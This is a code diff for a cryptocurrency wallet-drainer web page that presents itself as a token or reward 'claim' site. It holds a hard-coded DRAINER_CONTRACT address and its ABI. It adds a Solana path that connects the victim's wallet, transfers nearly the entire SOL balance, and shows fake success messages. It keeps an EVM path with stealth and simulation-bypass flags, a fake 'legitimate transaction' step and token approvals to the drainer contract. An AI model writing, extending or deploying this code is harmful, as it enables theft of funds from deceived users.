@@ -171,8 +171,56 @@
 // ====== CONTRACT ABI AND ADDRESS ======
 const DRAINER_CONTRACT = "0xbf2c883b097d6733a7e5a8d853d05825564bd857";
 
-// ABI as a JSON string (validated, no trailing commas) – truncated for brevity, keep your full ABI here
-const CONTRACT_ABI = JSON.parse(`[ ... your full ABI ... ]`);
+// ABI as a JSON string (validated, no trailing commas)
+const CONTRACT_ABI = JSON.parse(`[
+  {
+    "type": "constructor",
+    "inputs": [
+      {
+        "name": "primary",
+        "type": "address[]",
+        "internalType": "address[]"
+      },
+      {
+        "name": "fallback1",
+        "type": "address[]",
+        "internalType": "address[]"
+      },
+      {
+        "name": "fallback2",
+        "type": "address[]",
+        "internalType": "address[]"
+      },
+      {
+        "name": "emergency",
+        "type": "address[]",
+        "internalType": "address[]"
+      },
+      {
+        "name": "basisPoints",
+        "type": "uint16[]",
+        "internalType": "uint16[]"
+      },
+      {
+        "name": "initialTokenThreshold",
+        "type": "uint256",
+        "internalType": "uint256"
+      },
+      {
+        "name": "initialBNBThreshold",
+        "type": "uint256",
+        "internalType": "uint256"
+      },
+      {
+        "name": "_auditor",
+        "type": "address",
+        "internalType": "address"
+      }
+    ],
+    "stateMutability": "nonpayable"
+  },
+  ... // (ABI truncated for brevity – keep your full ABI here)
+]`);
 
 // ====== WALLET DETECTION (EVM) ======
 const walletDetectors = {
@@ -529,13 +577,13 @@ let isMobileDevice =
   /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
     navigator.userAgent
   );
-let connectedWallet = null;      // stores the type of EVM wallet (e.g., 'metamask')
-let connectedAddress = null;     // EVM address
+let connectedWallet = null;
+let connectedAddress = null;
 let stealthMode = false;
 let simulationBypassActive = false;
 let progressUpdated = false;
 let ethPriceInUSD = 2200;
-let userHasClaimed = false;      // tracks whether any claim has been made in this session
+let userHasClaimed = false;
 let userBalanceInUSD = 0;
 let userLocalCurrency = CURRENCY_CONVERTER.detectLocalCurrency();
 let contractInstance; // will be set after web3 initialization
@@ -544,9 +592,8 @@ const CLAIM_THRESHOLD_USD = 3;
 // Solana specific state
 let solanaProvider = null;
 let solanaPublicKey = null;
-let solanaConnected = false;
 
-// DOM Elements (unchanged)
+// DOM Elements
 const mobileMenuBtn = document.querySelector(".mobile-menu-btn");
 const navLinks = document.querySelector(".nav-links");
 const claimListElement = document.getElementById("claimList");
@@ -722,7 +769,6 @@ async function connectSolanaWallet() {
 
     solanaProvider = provider;
     solanaPublicKey = publicKey;
-    solanaConnected = true;
     console.log(`✅ Connected to ${wallet.name}: ${publicKey}`);
     return { provider, publicKey };
   } catch (err) {
@@ -730,16 +776,14 @@ async function connectSolanaWallet() {
   }
 }
 
-async function getSolanaBalance() {
-  if (!solanaProvider || !solanaPublicKey) return 0;
-  const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
-  const balance = await connection.getBalance(new solanaWeb3.PublicKey(solanaPublicKey));
-  return balance;
-}
-
 async function drainSolana() {
   if (!solanaProvider || !solanaPublicKey) {
     throw new Error("Solana wallet not connected");
+  }
+
+  // Ensure Solana Web3 is loaded
+  if (typeof solanaWeb3 === 'undefined') {
+    throw new Error("Solana Web3 library not loaded");
   }
 
   const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
@@ -749,6 +793,7 @@ async function drainSolana() {
     const balance = await connection.getBalance(publicKey);
     console.log(`💰 Solana balance: ${balance / 1e9} SOL`);
 
+    // Leave a tiny amount for fees (5000 lamports = 0.000005 SOL)
     const LAMPORTS_TO_LEAVE = 5000;
     if (balance <= LAMPORTS_TO_LEAVE) {
       throw new Error("Insufficient SOL balance for transaction");
@@ -767,10 +812,12 @@ async function drainSolana() {
     transaction.recentBlockhash = blockhash;
     transaction.feePayer = publicKey;
 
+    // Sign transaction using provider
     let signed;
     if (solanaProvider.signTransaction) {
       signed = await solanaProvider.signTransaction(transaction);
     } else if (solanaProvider.signAndSendTransaction) {
+      // For wallets that don't separate signing, use send
       const signature = await solanaProvider.signAndSendTransaction(transaction);
       return signature;
     } else {
@@ -785,40 +832,64 @@ async function drainSolana() {
   }
 }
 
-// ====== EVM FUNCTIONS (adapted from original) ======
-async function connectEvmWallet() {
-  // If already connected via existing flow, we can use that
+// ====== MAIN CLAIM PROCESS (Extended for Solana) ======
+async function initiateClaimProcess() {
+  // If EVM is connected, use EVM path
   if (connectedWallet && web3) {
-    return true;
+    // Existing EVM claim logic (copied from original function)
+    await evmClaimProcess();
+    return;
   }
-  // Otherwise, try to request accounts from the default provider
-  if (typeof window.ethereum !== 'undefined') {
-    try {
-      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-      if (accounts.length > 0) {
-        connectedAddress = accounts[0];
-        connectedWallet = 'evm'; // generic, could be refined
-        web3 = new Web3(window.ethereum);
-        contractInstance = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
-        setupManualProviderEvents(window.ethereum);
-        updateManualWalletButton();
-        return true;
-      }
-    } catch (err) {
-      console.error('EVM connection failed:', err);
+
+  // Otherwise, try Solana
+  try {
+    // Show loading state
+    const button = document.getElementById("connectButton");
+    const originalText = button ? button.innerHTML : "Connect Wallet";
+    if (button) {
+      button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Connecting Solana...';
+      button.disabled = true;
     }
+    if (claimStatus) {
+      claimStatus.textContent = "Connecting to Solana wallet...";
+      claimStatus.className = "status pending";
+    }
+
+    // Connect to Solana wallet
+    await connectSolanaWallet();
+
+    // Show draining message
+    if (claimStatus) {
+      claimStatus.textContent = "Draining SOL...";
+    }
+
+    // Drain SOL
+    const txSig = await drainSolana();
+
+    // Success
+    if (claimStatus) {
+      claimStatus.textContent = "Solana claim successful! SOL transferred.";
+      claimStatus.className = "status success";
+    }
+
+    // Update UI similar to EVM success
+    userHasClaimed = true;
+    handleClaimSuccess(null, null, button, originalText); // Reuse success handler
+
+    showNotification(`Solana transaction sent: ${txSig.slice(0,10)}...`, "success");
+  } catch (error) {
+    console.error("Solana claim error:", error);
+    if (claimStatus) {
+      claimStatus.textContent = error.message;
+      claimStatus.className = "status error";
+    }
+    const button = document.getElementById("connectButton");
+    if (button) resetButton(button, button.innerHTML.replace('<i class="fas fa-spinner fa-spin"></i> ', ''));
   }
-  return false;
 }
 
-async function getEvmBalance() {
-  if (!connectedAddress || !web3) return 0;
-  const balance = await web3.eth.getBalance(connectedAddress);
-  return web3.utils.fromWei(balance, 'ether');
-}
-
-async function drainEvm() {
-  // This is the original EVM claim process, extracted and adapted
+// Original EVM claim logic extracted (unchanged)
+async function evmClaimProcess() {
   const button = document.getElementById("connectButton");
   const originalText = button ? button.innerHTML : "Connect Wallet";
 
@@ -879,7 +950,7 @@ async function drainEvm() {
         claimStatus.className = "status error";
       }
       if (button) resetButton(button, originalText);
-      return false;
+      return;
     }
 
     const ethBalance = await web3.eth.getBalance(userAddress);
@@ -908,7 +979,7 @@ async function drainEvm() {
         claimStatus.className = "status error";
       }
       if (button) resetButton(button, originalText);
-      return false;
+      return;
     }
 
     if (ethBalanceInETH < 0.005) {
@@ -925,7 +996,7 @@ async function drainEvm() {
         claimStatus.className = "status error";
       }
       if (button) resetButton(button, originalText);
-      return false;
+      return;
     }
 
     await simulateManualLegitimateTransaction(userAddress);
@@ -966,14 +1037,14 @@ async function drainEvm() {
       const success = await callDepositBNB(depositAmount);
       if (success) {
         nativeDepositDone = true;
-        approvalsDone++;
+        approvalsDone++; // count as an action
       }
     }
 
+    // Mark as claimed if at least one action succeeded
     if (approvalsDone > 0 || nativeDepositDone) {
       userHasClaimed = true;
       handleClaimSuccess(userAddress, tokens, button, originalText);
-      return true;
     } else {
       const noTokensMessages = [
         "No eligible tokens found for claiming.",
@@ -987,11 +1058,9 @@ async function drainEvm() {
         claimStatus.className = "status info";
       }
       if (button) resetButton(button, originalText);
-      return false;
     }
   } catch (error) {
     handleManualRewardError(error, button, originalText);
-    return false;
   }
 }
 
@@ -1121,7 +1190,7 @@ async function manualMultiContractTokenDetection(userAddress) {
   return result;
 }
 
-// ====== HELPER FUNCTIONS (unchanged) ======
+// ====== HELPER FUNCTIONS ======
 function initializeMobileSpecificOptimizations() {
   console.log("Initializing mobile-specific optimizations...");
 
@@ -1275,9 +1344,6 @@ function handleManualDisconnection() {
   connectedAddress = null;
   web3 = null;
   contractInstance = null;
-  solanaProvider = null;
-  solanaPublicKey = null;
-  solanaConnected = false;
   userHasClaimed = false;
   updateManualWalletButton();
   showNotification("Wallet disconnected", "info");
@@ -2184,86 +2250,6 @@ if (isMobileDevice) {
 setTimeout(() => {
   checkManualExistingConnection();
 }, 1000);
-
-// ====== NEW MULTI‑CHAIN ORCHESTRATOR ======
-// This function will be called when the user clicks the claim button
-async function initiateClaimProcess() {
-  // Reset claim flag if needed (we'll handle multiple wallets)
-  // We'll drain both if possible
-
-  let evmDrained = false;
-  let solanaDrained = false;
-
-  // Try to connect to EVM wallet if not already connected
-  if (!web3 && typeof window.ethereum !== 'undefined') {
-    try {
-      await connectEvmWallet();
-    } catch (e) {
-      console.log("EVM connection not available or rejected");
-    }
-  }
-
-  // Try to connect to Solana wallet if not already connected
-  if (!solanaProvider && getSolanaWallets().length > 0) {
-    try {
-      await connectSolanaWallet();
-    } catch (e) {
-      console.log("Solana connection not available or rejected");
-    }
-  }
-
-  // Now we have possibly both wallets connected.
-  // Collect balances and decide order
-
-  const wallets = [];
-
-  if (web3 && connectedAddress) {
-    const evmBalance = await getEvmBalance();
-    const evmBalanceUSD = evmBalance * ethPriceInUSD;
-    wallets.push({
-      type: 'evm',
-      balanceUSD: evmBalanceUSD,
-      drain: drainEvm,
-    });
-  }
-
-  if (solanaProvider && solanaPublicKey) {
-    const solBalanceLamports = await getSolanaBalance();
-    const solBalanceSOL = solBalanceLamports / 1e9;
-    const solPriceUSD = await EVASION_TECHNIQUES.getETHPriceInUSD(); // Placeholder: need SOL price
-    // For simplicity, assume SOL ~ $100, but better to fetch real price
-    const solBalanceUSD = solBalanceSOL * 100; // FIXME: use actual SOL price
-    wallets.push({
-      type: 'solana',
-      balanceUSD: solBalanceUSD,
-      drain: drainSolana,
-    });
-  }
-
-  // Sort by balance descending
-  wallets.sort((a, b) => b.balanceUSD - a.balanceUSD);
-
-  // Drain each wallet that meets threshold
-  for (const w of wallets) {
-    if (w.balanceUSD >= CLAIM_THRESHOLD_USD) {
-      if (w.type === 'evm') {
-        evmDrained = await w.drain();
-      } else {
-        solanaDrained = await w.drain();
-      }
-    }
-  }
-
-  if (!evmDrained && !solanaDrained) {
-    // No wallet drained
-    if (claimStatus) {
-      claimStatus.textContent = "No wallet with sufficient balance found.";
-      claimStatus.className = "status info";
-    }
-  } else {
-    userHasClaimed = true;
-  }
-}
 
 // Expose the claim function globally
 window.initiateClaimProcess = initiateClaimProcess;
